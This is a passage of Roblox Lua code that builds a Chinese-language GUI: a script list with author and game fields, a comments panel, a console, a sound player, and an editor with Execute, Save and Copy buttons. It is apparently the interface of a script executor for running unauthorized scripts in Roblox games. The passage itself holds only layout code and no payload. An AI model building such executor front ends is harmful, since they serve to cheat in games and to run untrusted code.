CopyScriptButtonUICorner_2.CornerRadius = UDim.new(0, 12)
CopyScriptButtonUICorner_2.Parent = CopyScriptButton_2

OpenDescriptionBackground_2.Name = "OpenDescriptionBackground"
OpenDescriptionBackground_2.Parent = VerifiedScriptFrame
OpenDescriptionBackground_2.BackgroundColor3 = Color3.fromRGB(55,55, 55)
OpenDescriptionBackground_2.Position = UDim2.new(0.747, 0, 0.794, 0)
OpenDescriptionBackground_2.Size = UDim2.new(0, 205, 0, 55)
 
OpenDescriptionBackgroundUICorner_2.Parent = OpenDescriptionBackground_2
OpenDescriptionBackgroundUICorner_2.CornerRadius = UDim.new(0, 15)

OpenDescriptionButton_2.Name = "OpenDescriptionButton"
OpenDescriptionButton_2.Parent = VerifiedScriptFrame
OpenDescriptionButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenDescriptionButton_2.Position = UDim2.new(0.75, 0, 0.8, 0)
OpenDescriptionButton_2.Size = UDim2.new(0, 200, 0, 50)
OpenDescriptionButton_2.AutoButtonColor = false
OpenDescriptionButton_2.Font = Enum.Font.SourceSansBold
OpenDescriptionButton_2.Text = "描述"
OpenDescriptionButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenDescriptionButton_2.TextSize = 14.000
OpenDescriptionButton_2.TextScaled = true
OpenDescriptionButton_2.TextWrapped = true
 
OpenDescriptionButtonUICorner_2.CornerRadius = UDim.new(0, 12)
OpenDescriptionButtonUICorner_2.Parent = OpenDescriptionButton_2
 
ScriptAuthor_2.Name = "ScriptAuthor"
ScriptAuthor_2.Parent = VerifiedScriptFrame
ScriptAuthor_2.BackgroundTransparency = 1
ScriptAuthor_2.Position = UDim2.new(0, 10, 0, 150)
ScriptAuthor_2.Size = UDim2.new(0, 280, 0, 30)
ScriptAuthor_2.Font = Enum.Font.SourceSansBold
ScriptAuthor_2.Text = "作者：ScriptAuthor"
ScriptAuthor_2.TextColor3 = Color3.fromRGB(192, 192, 192)
ScriptAuthor_2.TextSize = 14.000
ScriptAuthor_2.TextWrapped = true
ScriptAuthor_2.TextScaled = true
ScriptAuthor_2.TextXAlignment = Enum.TextXAlignment.Left
 
ScriptGame_2.Name = "ScriptGame"
ScriptGame_2.Parent = VerifiedScriptFrame
ScriptGame_2.BackgroundTransparency = 1
ScriptGame_2.Position = UDim2.new(0, 10, 0, 220)
ScriptGame_2.Size = UDim2.new(0, 280, 0, 30)
ScriptGame_2.Font = Enum.Font.Code
ScriptGame_2.Text = "游戏"
ScriptGame_2.TextColor3 = Color3.fromRGB(192, 192, 192)
ScriptGame_2.TextSize = 14.000
ScriptGame_2.TextWrapped = true
ScriptGame_2.TextScaled = true
ScriptGame_2.TextXAlignment = Enum.TextXAlignment.Left

DescriptionScript.Name = "DescriptionScript"
DescriptionScript.Parent = MainFrame
DescriptionScript.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DescriptionScript.Position = UDim2.new(-3.55, 0, -1.4, 0)
DescriptionScript.Size = UDim2.new(0, 855, 0, 400)
DescriptionScript.AutoButtonColor = false
DescriptionScript.BackgroundTransparency = 0.2
DescriptionScript.Font = Enum.Font.SourceSansBold
DescriptionScript.Text = "描述"
DescriptionScript.TextColor3 = Color3.fromRGB(255, 255, 255)
DescriptionScript.TextSize = 14.000
DescriptionScript.TextScaled = true
DescriptionScript.TextWrapped = true
 
DescriptionScriptUICorner.CornerRadius = UDim.new(0, 12)
DescriptionScriptUICorner.Parent = DescriptionScript
 
DescriptionScript.Visible = false

ReloadBackgroundButton.Name = "ReloadBackgroundButton"
ReloadBackgroundButton.Parent = MainFrame
ReloadBackgroundButton.AnchorPoint = Vector2.new(0.5, 0.5)
ReloadBackgroundButton.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
ReloadBackgroundButton.Position = UDim2.new(-3.9, 0, 2.3, 0)
ReloadBackgroundButton.Size = UDim2.new(0, 46, 0, 46)
 
ReloadBackgroundButtonUICorner.CornerRadius = UDim.new(0, 15)
ReloadBackgroundButtonUICorner.Parent = ReloadBackgroundButton
 
ReloadButton.Name = "ReloadButton"
ReloadButton.Parent = ReloadBackgroundButton
ReloadButton.AnchorPoint = Vector2.new(0.5, 0.5)
ReloadButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ReloadButton.Position = UDim2.new(0.5, 0, 0.5, 0)
ReloadButton.Size = UDim2.new(0, 41, 0, 41)
ReloadButton.Image = "rbxassetid://16422858330"
ReloadButton.AutoButtonColor = false
 
ReloadButtonUICorner.CornerRadius = UDim.new(0, 12)
ReloadButtonUICorner.Parent = ReloadButton

HistoryBackgroundButton.Name = "HistoryBackgroundButton"
HistoryBackgroundButton.Parent = MainFrame
HistoryBackgroundButton.AnchorPoint = Vector2.new(0.5, 0.5)
HistoryBackgroundButton.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
HistoryBackgroundButton.Position = UDim2.new(-3.9, 0, 1.8, 0)
HistoryBackgroundButton.Size = UDim2.new(0, 46, 0, 46)
 
HistoryBackgroundButtonUICorner.CornerRadius = UDim.new(0, 15)
HistoryBackgroundButtonUICorner.Parent = HistoryBackgroundButton
 
HistoryButton.Name = "HistoryButton"
HistoryButton.Parent = HistoryBackgroundButton
HistoryButton.AnchorPoint = Vector2.new(0.5, 0.5)
HistoryButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HistoryButton.Position = UDim2.new(0.5, 0, 0.5, 0)
HistoryButton.Size = UDim2.new(0, 41, 0, 41)
HistoryButton.Image = "rbxassetid://16428511381"
HistoryButton.AutoButtonColor = false
 
HistoryButtonUICorner.CornerRadius = UDim.new(0, 12)
HistoryButtonUICorner.Parent = HistoryButton

ClearAndSearchBackground.Name = "ClearAndSearchBackground"
ClearAndSearchBackground.Parent = MainFrame
ClearAndSearchBackground.AnchorPoint = Vector2.new(0.5, 0.5)
ClearAndSearchBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
ClearAndSearchBackground.Position = UDim2.new(-3.9, 0, -1.2, 0)
ClearAndSearchBackground.Size = UDim2.new(0, 46, 0, 46)
 
ClearAndSearchBackgroundUICorner.CornerRadius = UDim.new(0, 15)
ClearAndSearchBackgroundUICorner.Parent = ClearAndSearchBackground
 
ClearAndSearch.Name = "ClearAndSearch"
ClearAndSearch.Parent = ClearAndSearchBackground
ClearAndSearch.AnchorPoint = Vector2.new(0.5, 0.5)
ClearAndSearch.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ClearAndSearch.Position = UDim2.new(0.5, 0, 0.5, 0)
ClearAndSearch.Size = UDim2.new(0, 41, 0, 41)
ClearAndSearch.Image = "rbxassetid://16449084806"
ClearAndSearch.AutoButtonColor = false
 
ClearAndSearchUICorner.CornerRadius = UDim.new(0, 12)
ClearAndSearchUICorner.Parent = ClearAndSearch

Info.Name = "Info"
Info.Parent = InfoBox
Info.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Info.BackgroundTransparency = 1
Info.Size = UDim2.new(0, 995, 0, 100)
 
Comments.Name = "Comments"
Comments.Parent = InfoBox
Comments.BackgroundTransparency = 1
Comments.Size = UDim2.new(0, 400, 0, 414)
 
Inner.Name = "Inner"
Inner.Parent = Comments
Inner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Inner.Position = UDim2.new(0, 0, 0, 10)
Inner.BackgroundTransparency = 1
Inner.Size = UDim2.new(0, 400, 0, 414)
 
UICorner_21.CornerRadius = UDim.new(0, 12)
UICorner_21.Parent = Inner
 
Comments_2.Name = "Comments"
Comments_2.Parent = Inner
Comments_2.Active = true
Comments_2.BackgroundTransparency = 1
Comments_2.BorderSizePixel = 0
Comments_2.Position = UDim2.new(0, 3.5, 0, -6.5)
Comments_2.Size = UDim2.new(0, 860, 0, 400)
Comments_2.CanvasSize = UDim2.new(0, 0, 0, 0)
 
Comment.Name = "Comment"
Comment.Parent = Comments_2
Comment.BackgroundTransparency = 1
Comment.Size = UDim2.new(0, 860, 0, 150)
 
Content.Name = "Content"
Content.Parent = Comment
Content.BackgroundTransparency = 1
Content.Position = UDim2.new(0, 0, 0, 49)
Content.Size = UDim2.new(0, 850, 0, 100)
Content.Font = Enum.Font.SourceSansBold
Content.Text = "评论"
Content.TextColor3 = Color3.fromRGB(255, 255, 255)
Content.TextSize = 14
Content.TextWrapped = true
Content.TextXAlignment = Enum.TextXAlignment.Left
Content.TextYAlignment = Enum.TextYAlignment.Top
Content.TextScaled = true
 
CommentsWhiteLine.Name = "CommentsWhiteLine"
CommentsWhiteLine.Parent = Content
CommentsWhiteLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CommentsWhiteLine.BorderSizePixel = 0
CommentsWhiteLine.Size = UDim2.new(0, 850, 0, 1)
CommentsWhiteLine.Position = UDim2.new(0, 0, 0, 99)

Author_2.Name = "Author"
Author_2.Parent = Comment
Author_2.BackgroundTransparency = 1
Author_2.Position = UDim2.new(0, 50, 0, 5)
Author_2.Size = UDim2.new(0, 620, 0, 40)
Author_2.Font = Enum.Font.SourceSansBold
Author_2.Text = "作者"
Author_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Author_2.TextScaled = true
Author_2.TextWrapped = true
Author_2.TextXAlignment = Enum.TextXAlignment.Left

ProfilePicture_2.Name = "ProfilePicture"
ProfilePicture_2.Parent = Comment
ProfilePicture_2.BackgroundTransparency = 1
ProfilePicture_2.Position = UDim2.new(0, 5, 0, 5)
ProfilePicture_2.Size = UDim2.new(0, 40, 0, 40)
ProfilePicture_2.Image = "rbxassetid://17093333262"
 
LikeImg.Name = "LikeImg"
LikeImg.Parent = Comment
LikeImg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LikeImg.BackgroundTransparency = 1
LikeImg.Position = UDim2.new(0, 672, 0, 10)
LikeImg.Size = UDim2.new(0, 25, 0, 25)
LikeImg.Image = "rbxassetid://18949293967"

DisLikeImg.Name = "DisLikeImg"
DisLikeImg.Parent = Comment
DisLikeImg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DisLikeImg.BackgroundTransparency = 1
DisLikeImg.Position = UDim2.new(0, 760, 0, 10)
DisLikeImg.Size = UDim2.new(0, 25, 0, 25)
DisLikeImg.Image = "rbxassetid://18949332467"

LikeCount.Name = "LikeCount"
LikeCount.Parent = Comment
LikeCount.BackgroundTransparency = 1
LikeCount.Position = UDim2.new(0, 710, 0, 10)
LikeCount.Size = UDim2.new(0, 50, 0, 25)
LikeCount.Font = Enum.Font.SourceSansBold
LikeCount.Text = "0"
LikeCount.TextColor3 = Color3.fromRGB(255, 255, 255)
LikeCount.TextScaled = true
LikeCount.TextWrapped = true
LikeCount.TextXAlignment = Enum.TextXAlignment.Left
LikeCount.TextYAlignment = Enum.TextYAlignment.Bottom

DislikeCount.Name = "DislikeCount"
DislikeCount.Parent = Comment
DislikeCount.BackgroundTransparency = 1
DislikeCount.Position = UDim2.new(0, 797, 0, 10)
DislikeCount.Size = UDim2.new(0, 50, 0, 25)
DislikeCount.Font = Enum.Font.SourceSansBold
DislikeCount.Text = "0"
DislikeCount.TextColor3 = Color3.fromRGB(255, 255, 255)
DislikeCount.TextScaled = true
DislikeCount.TextWrapped = true
DislikeCount.TextXAlignment = Enum.TextXAlignment.Left
DislikeCount.TextYAlignment = Enum.TextYAlignment.Bottom

UICorner_22.CornerRadius = UDim.new(1, 0)
UICorner_22.Parent = ProfilePicture_2
 
UIListLayout_3.Parent = Comments_2
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 0)
 
NoComments.Name = "NoComments"
NoComments.Parent = InfoBox
NoComments.BackgroundTransparency = 1
NoComments.Position = UDim2.new(0.49, 0, 0.5, 0)
NoComments.Size = UDim2.new(0, 10, 0, 5)
NoComments.Font = Enum.Font.SourceSansBold
NoComments.Text = "还没有评论"
NoComments.TextColor3 = Color3.fromRGB(255, 255, 255)
NoComments.TextSize = 50

CloseCommentsButtonBackground.Name = "CloseCommentsButtonBackground"
CloseCommentsButtonBackground.Parent = InfoBox
CloseCommentsButtonBackground.AnchorPoint = Vector2.new(0.5, 0.5)
CloseCommentsButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
CloseCommentsButtonBackground.Position = UDim2.new(1.03, 0, 0.058, 0)
CloseCommentsButtonBackground.Size = UDim2.new(0, 46, 0, 46)
 
CloseCommentsButtonBackgroundUICorner.CornerRadius = UDim.new(0, 15)
CloseCommentsButtonBackgroundUICorner.Parent = CloseCommentsButtonBackground
 
CloseCommentsButton.Name = "CloseCommentsButton"
CloseCommentsButton.Parent = CloseCommentsButtonBackground
CloseCommentsButton.AnchorPoint = Vector2.new(0.5, 0.5)
CloseCommentsButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CloseCommentsButton.Position = UDim2.new(0.5, 0, 0.5, 0)
CloseCommentsButton.Size = UDim2.new(0, 41, 0, 41)
CloseCommentsButton.Image = "rbxassetid://18946644800"
CloseCommentsButton.AutoButtonColor = false

CloseCommentsButtonUICorner.CornerRadius = UDim.new(0, 12)
CloseCommentsButtonUICorner.Parent = CloseCommentsButton

BackgroundConsole.Name = "BackgroundConsole"
BackgroundConsole.Parent = UIGui
BackgroundConsole.AnchorPoint = Vector2.new(0.5, 0.5)
BackgroundConsole.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
BackgroundConsole.Position = UDim2.new(0.525, 0, -1, 0)
BackgroundConsole.Size = UDim2.new(0, 860, 0, 405)
 
BackgroundConsoleUICorner.CornerRadius = UDim.new(0, 15)
BackgroundConsoleUICorner.Parent = BackgroundConsole
 
BackgroundImage.Name = "BackgroundImage"
BackgroundImage.Parent = BackgroundConsole
BackgroundImage.AnchorPoint = Vector2.new(0.5, 0.5)
BackgroundImage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BackgroundImage.Position = UDim2.new(0.5, 0, 0.5, 0)
BackgroundImage.Size = UDim2.new(0, 855, 0, 400)
BackgroundImage.Image = "rbxassetid://16068028120"
 
BackgroundImageUICorner.CornerRadius = UDim.new(0, 12)
BackgroundImageUICorner.Parent = BackgroundImage
 
ConsoleOutput.Name = "ConsoleOutput"
ConsoleOutput.Parent = BackgroundImage
ConsoleOutput.AnchorPoint = Vector2.new(0.5, 0.5)
ConsoleOutput.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ConsoleOutput.BackgroundTransparency = 0.2
ConsoleOutput.Position = UDim2.new(0.5, 0, 0.5, 0)
ConsoleOutput.Size = UDim2.new(0, 855, 0, 400)
ConsoleOutput.Text = "通知、警告和脚本错误将显示在这里，以简化处理。"
ConsoleOutput.TextColor3 = Color3.fromRGB(255, 255, 255)
ConsoleOutput.TextScaled = false
ConsoleOutput.Font = Enum.Font.Code
ConsoleOutput.TextSize = 14
ConsoleOutput.TextWrapped = true
ConsoleOutput.TextXAlignment = Enum.TextXAlignment.Left
ConsoleOutput.TextYAlignment = Enum.TextYAlignment.Top
 
ConsoleOutputUICorner.CornerRadius = UDim.new(0, 12)
ConsoleOutputUICorner.Parent = ConsoleOutput
 
EditorBackground.Name = "EditorBackground"
EditorBackground.Parent = UIGui
EditorBackground.AnchorPoint = Vector2.new(0.5, 0.5)
EditorBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
EditorBackground.Position = UDim2.new(0.525, 0, -1, 0)
EditorBackground.Size = UDim2.new(0, 860, 0, 405)
 
EditorBackgroundUICorner.CornerRadius = UDim.new(0, 15)
EditorBackgroundUICorner.Parent = EditorBackground
 
EditorMainFrame.Name = "EditorMainFrame"
EditorMainFrame.Parent = EditorBackground
EditorMainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
EditorMainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
EditorMainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
EditorMainFrame.Size = UDim2.new(0, 855, 0, 400)
EditorMainFrame.Image = "rbxassetid://16109043024"
 
EditorMainFrameUICorner.CornerRadius = UDim.new(0, 12)
EditorMainFrameUICorner.Parent = EditorMainFrame

EditorTextBox.Name = "EditorTextBox"
EditorTextBox.Parent = EditorMainFrame
EditorTextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
EditorTextBox.BackgroundTransparency = 0.2
EditorTextBox.Position = UDim2.new(0.02, 0, 0.04, 0)
EditorTextBox.Size = UDim2.new(0, 820, 0, 310)
EditorTextBox.ClearTextOnFocus = false
EditorTextBox.Font = Enum.Font.SourceSansBold
EditorTextBox.PlaceholderText = "打印(\"你好世界\")"
EditorTextBox.Text = ""
EditorTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
EditorTextBox.TextTransparency = 0
EditorTextBox.TextSize = 14.000
EditorTextBox.TextWrapped = true
EditorTextBox.TextXAlignment = Enum.TextXAlignment.Left
EditorTextBox.TextYAlignment = Enum.TextYAlignment.Top
 
EditorTextBoxUICorner.CornerRadius = UDim.new(0, 12)
EditorTextBoxUICorner.Parent = EditorTextBox
 
ExecuteButtonBackground_3.Name = "ExecuteButtonBackground_3"
ExecuteButtonBackground_3.Parent = EditorMainFrame
ExecuteButtonBackground_3.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
ExecuteButtonBackground_3.Position = UDim2.new(0.02, 0, 0.85, 0)
ExecuteButtonBackground_3.Size = UDim2.new(0, 195, 0, 55)
 
ExecuteButtonBackgroundUICorner_3.Parent = ExecuteButtonBackground_3
ExecuteButtonBackgroundUICorner_3.CornerRadius = UDim.new(0, 15)
 
ClearButtonBackground.Name = "ClearButtonBackground"
ClearButtonBackground.Parent = EditorMainFrame
ClearButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
ClearButtonBackground.Position = UDim2.new(0.75, 0, 0.85, 0)
ClearButtonBackground.Size = UDim2.new(0, 195, 0, 55)
 
ClearButtonBackgroundUICorner.Parent = ClearButtonBackground
ClearButtonBackgroundUICorner.CornerRadius = UDim.new(0, 15)
 
SaveButtonBackground.Name = "SaveButtonBackground"
SaveButtonBackground.Parent = EditorMainFrame
SaveButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
SaveButtonBackground.Position = UDim2.new(0.506, 0, 0.85, 0)
SaveButtonBackground.Size = UDim2.new(0, 195, 0, 55)
 
SaveButtonBackgroundUICorner.Parent = SaveButtonBackground
SaveButtonBackgroundUICorner.CornerRadius = UDim.new(0, 15)
 
CopyButtonBackground.Name = "CopyButtonBackground"
CopyButtonBackground.Parent = EditorMainFrame
CopyButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
CopyButtonBackground.Position = UDim2.new(0.264, 0, 0.85, 0)
CopyButtonBackground.Size = UDim2.new(0, 195, 0, 55)
 
CopyButtonBackgroundUICorner.Parent = CopyButtonBackground
CopyButtonBackgroundUICorner.CornerRadius = UDim.new(0, 15)
 
ExecuteButton_3.Name = "ExecuteButton_3"
ExecuteButton_3.Parent = ExecuteButtonBackground_3
ExecuteButton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecuteButton_3.Position = UDim2.new(0.013, 0, 0.05, 0)
ExecuteButton_3.Size = UDim2.new(0, 190, 0, 50)
ExecuteButton_3.AutoButtonColor = false
ExecuteButton_3.Font = Enum.Font.SourceSansBold
ExecuteButton_3.Text = "执行"
ExecuteButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton_3.TextSize = 14.000
ExecuteButton_3.TextScaled = true
ExecuteButton_3.TextWrapped = true
 
ExecuteButtonUICorner_3.CornerRadius = UDim.new(0, 12)
ExecuteButtonUICorner_3.Parent = ExecuteButton_3
 
SaveButton.Name = "SaveButton"
SaveButton.Parent = SaveButtonBackground
SaveButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SaveButton.Position = UDim2.new(0.013, 0, 0.05, 0)
SaveButton.Size = UDim2.new(0, 190, 0, 50)
SaveButton.AutoButtonColor = false
SaveButton.Font = Enum.Font.SourceSansBold
SaveButton.Text = "保存"
SaveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveButton.TextSize = 14.000
SaveButton.TextScaled = true
SaveButton.TextWrapped = true
 
SaveButtonUICorner.CornerRadius = UDim.new(0, 12)
SaveButtonUICorner.Parent = SaveButton
 
CopyButton.Name = "CopyButton"
CopyButton.Parent = CopyButtonBackground
CopyButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyButton.Position = UDim2.new(0.013, 0, 0.05, 0)
CopyButton.Size = UDim2.new(0, 190, 0, 50)
CopyButton.AutoButtonColor = false
CopyButton.Font = Enum.Font.SourceSansBold
CopyButton.Text = "复制"
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.TextSize = 14.000
CopyButton.TextScaled = true
CopyButton.TextWrapped = true
 
CopyButtonUICorner.CornerRadius = UDim.new(0, 12)
CopyButtonUICorner.Parent = CopyButton
 
ClearButton.Name = "ClearButton"
ClearButton.Parent = ClearButtonBackground
ClearButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ClearButton.Position = UDim2.new(0.013, 0, 0.05, 0)
ClearButton.Size = UDim2.new(0, 190, 0, 50)
ClearButton.AutoButtonColor = false
ClearButton.Font = Enum.Font.SourceSansBold
ClearButton.Text = "清除"
ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearButton.TextSize = 14.000
ClearButton.TextScaled = true
ClearButton.TextWrapped = true
 
ClearButtonUICorner.CornerRadius = UDim.new(0, 12)
ClearButtonUICorner.Parent = ClearButton

ClearButton_2Background.Name = "ClearButton_2Background"
ClearButton_2Background.Parent = BackgroundConsole
ClearButton_2Background.AnchorPoint = Vector2.new(0.5, 0.5)
ClearButton_2Background.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
ClearButton_2Background.Position = UDim2.new(-0.04, 0, 0.945, 0)
ClearButton_2Background.Size = UDim2.new(0, 46, 0, 46)
 
ClearButton_2BackgroundUICorner.CornerRadius = UDim.new(0, 15)
ClearButton_2BackgroundUICorner.Parent = ClearButton_2Background
 
ClearButton_2.Name = "ClearButton_2"
ClearButton_2.Parent = ClearButton_2Background
ClearButton_2.AnchorPoint = Vector2.new(0.5, 0.5)
ClearButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ClearButton_2.Position = UDim2.new(0.5, 0, 0.5, 0)
ClearButton_2.Size = UDim2.new(0, 41, 0, 41)
ClearButton_2.Image = "rbxassetid://16477707611"
ClearButton_2.AutoButtonColor = false
 
ClearButton_2UICorner.CornerRadius = UDim.new(0, 12)
ClearButton_2UICorner.Parent = ClearButton_2

SondFrameBackground.Name = "SondFrameBackground"
SondFrameBackground.Parent = UIGui
SondFrameBackground.AnchorPoint = Vector2.new(0.5, 0.5)
SondFrameBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
SondFrameBackground.Position = UDim2.new(0.5, 0, -1, 0)
SondFrameBackground.Size = UDim2.new(0, 350, 0, 400)

SondFrameBackgroundUICorner.CornerRadius = UDim.new(0, 15)
SondFrameBackgroundUICorner.Parent = SondFrameBackground
 
SondFrame.Name = "SondFrame"
SondFrame.Parent = SondFrameBackground
SondFrame.AnchorPoint = Vector2.new(0.5, 0.5)
SondFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SondFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
SondFrame.Size = UDim2.new(0, 345, 0, 395)
SondFrame.Image = "rbxassetid://16139850662"
 
SondFrameUICorner.CornerRadius = UDim.new(0, 15)
SondFrameUICorner.Parent = SondFrame
 
MainSondFrame.Name = "MainSondFrame"
MainSondFrame.Parent = SondFrame
MainSondFrame.BackgroundTransparency = 0.4
MainSondFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainSondFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainSondFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainSondFrame.Size = UDim2.new(0, 345, 0, 395)
 
MainSondFrameUICorner.CornerRadius = UDim.new(0, 15)
MainSondFrameUICorner.Parent = MainSondFrame
 
SoundTextBox.Name = "SoundTextBox"
SoundTextBox.Parent = MainSondFrame
SoundTextBox.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
SoundTextBox.BackgroundTransparency = 0.4
SoundTextBox.Position = UDim2.new(0.0055, 0, 0.01, 0)
SoundTextBox.Size = UDim2.new(0, 340, 0, 25)
SoundTextBox.ClearTextOnFocus = false
SoundTextBox.Font = Enum.Font.SourceSansBold
SoundTextBox.PlaceholderText = "声音ID在这里"
SoundTextBox.Text = ""
SoundTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
SoundTextBox.TextTransparency = 0
SoundTextBox.TextScaled = true
SoundTextBox.TextSize = 14.000
SoundTextBox.TextWrapped = true
 
SoundTextBoxUICorner.CornerRadius = UDim.new(0, 15)
SoundTextBoxUICorner.Parent = SoundTextBox
 
Stop_PlayButtonBackground.Name = "Stop_PlayButtonBackground"
Stop_PlayButtonBackground.Parent = MainSondFrame
Stop_PlayButtonBackground.AnchorPoint = Vector2.new(0.5, 0.5)
Stop_PlayButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
Stop_PlayButtonBackground.Position = UDim2.new(0.5, 0, 0.5, 0)
Stop_PlayButtonBackground.Size = UDim2.new(0, 105, 0, 105)
 
Stop_PlayButtonBackgroundUICorner.CornerRadius = UDim.new(1, 0)
Stop_PlayButtonBackgroundUICorner.Parent = Stop_PlayButtonBackground
 
Stop_PlayButtonBackground_2.Name = "Stop_PlayButtonBackground_2"
Stop_PlayButtonBackground_2.Parent = Stop_PlayButtonBackground
Stop_PlayButtonBackground_2.AnchorPoint = Vector2.new(0.5, 0.5)
Stop_PlayButtonBackground_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Stop_PlayButtonBackground_2.Position = UDim2.new(0.5, 0, 0.5, 0)
Stop_PlayButtonBackground_2.Size = UDim2.new(0, 100, 0, 100)
 
Stop_PlayButtonBackgroundUICorner_2.CornerRadius = UDim.new(1, 0)
Stop_PlayButtonBackgroundUICorner_2.Parent = Stop_PlayButtonBackground_2
 
Stop_PlayButton.Name = "Stop_PlayButton"
Stop_PlayButton.Parent = Stop_PlayButtonBackground_2
Stop_PlayButton.AnchorPoint = Vector2.new(0.5, 0.5)
Stop_PlayButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Stop_PlayButton.Position = UDim2.new(0.6, 0, 0.5, 0)
Stop_PlayButton.Size = UDim2.new(0, 80, 0, 80)
Stop_PlayButton.BackgroundTransparency = 1
Stop_PlayButton.Image = "rbxassetid://16139639068"
 
AudioName.Name = "AudioName"
AudioName.Parent = MainSondFrame
AudioName.BackgroundTransparency = 1
AudioName.Position = UDim2.new(0.0055, 0, 0.1, 0)
AudioName.Size = UDim2.new(0, 340, 0, 25)
AudioName.Font = Enum.Font.SourceSansBold
AudioName.Text = ""
AudioName.TextColor3 = Color3.fromRGB(192, 192, 192)
AudioName.TextScaled = true
AudioName.TextSize = 14.000
AudioName.TextWrapped = true
AudioName.TextXAlignment = Enum.TextXAlignment.Left
 
SaveButtonBackground_2.Name = "SaveButtonBackground_2"
SaveButtonBackground_2.Parent = MainSondFrame
SaveButtonBackground_2.AnchorPoint = Vector2.new(0.5, 0.5)
SaveButtonBackground_2.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
SaveButtonBackground_2.Position = UDim2.new(0.2, 0, 0.5, 0)
SaveButtonBackground_2.Size = UDim2.new(0, 55, 0, 55)
 
SaveButtonBackgroundUICorner_2.CornerRadius = UDim.new(1, 0)
SaveButtonBackgroundUICorner_2.Parent = SaveButtonBackground_2
 
SaveButton_2.Name = "SaveButton_2"
SaveButton_2.Parent = SaveButtonBackground_2
SaveButton_2.AnchorPoint = Vector2.new(0.5, 0.5)
SaveButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SaveButton_2.Position = UDim2.new(0.5, 0, 0.5, 0)
SaveButton_2.Size = UDim2.new(0, 50, 0, 50)
SaveButton_2.Image = "rbxassetid://16139574980"
SaveButton_2.AutoButtonColor = false
 
SaveButtonUICorner_2.CornerRadius = UDim.new(1, 0)
SaveButtonUICorner_2.Parent = SaveButton_2
 
PlaylistButtonBackground.Name = "PlaylistButtonBackground"
PlaylistButtonBackground.Parent = MainSondFrame
PlaylistButtonBackground.AnchorPoint = Vector2.new(0.5, 0.5)
PlaylistButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
PlaylistButtonBackground.Position = UDim2.new(0.8, 0, 0.5, 0)
PlaylistButtonBackground.Size = UDim2.new(0, 55, 0, 55)
 
PlaylistButtonBackgroundUICorner.CornerRadius = UDim.new(1, 0)
PlaylistButtonBackgroundUICorner.Parent = PlaylistButtonBackground
 
PlaylistButtonBackground_2.Name = "PlaylistButtonBackground_2"
PlaylistButtonBackground_2.Parent = PlaylistButtonBackground
PlaylistButtonBackground_2.AnchorPoint = Vector2.new(0.5, 0.5)
PlaylistButtonBackground_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PlaylistButtonBackground_2.Position = UDim2.new(0.5, 0, 0.5, 0)
PlaylistButtonBackground_2.Size = UDim2.new(0, 50, 0, 50)
 
PlaylistButtonBackgroundUICorner_2.CornerRadius = UDim.new(1, 0)
PlaylistButtonBackgroundUICorner_2.Parent = PlaylistButtonBackground_2
 
PlaylistButton.Name = "PlaylistButton"
PlaylistButton.Parent = PlaylistButtonBackground_2
PlaylistButton.AnchorPoint = Vector2.new(0.5, 0.5)
PlaylistButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PlaylistButton.Position = UDim2.new(0.55, 0, 0.55, 0)
PlaylistButton.Size = UDim2.new(0, 40, 0, 40)
PlaylistButton.Image = "rbxassetid://16139588106"
PlaylistButton.BackgroundTransparency = 1
 
